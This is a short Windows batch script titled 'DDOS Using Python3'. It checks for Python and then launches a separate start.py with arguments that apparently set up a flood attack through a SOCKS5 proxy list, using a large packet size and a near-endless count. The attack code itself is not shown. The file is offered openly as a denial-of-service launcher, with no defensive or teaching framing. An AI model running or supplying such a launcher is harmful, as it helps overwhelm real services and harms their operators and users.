@echo off
TITLE DDOS Using Python3 | KhanhNguyen9872
color 17

:CHECKPYTHON
python --version 3>NUL
if errorlevel 1 goto ERROR
goto MAIN

:MAIN
clear
python start.py get khanh 1 68 socket5.txt 65500 999999999999999
pause
exit

:ERROR
clear
echo.
echo Error^: Python not installed
echo.
start "" "https://python.org/downloads/windows" 
pause
exit
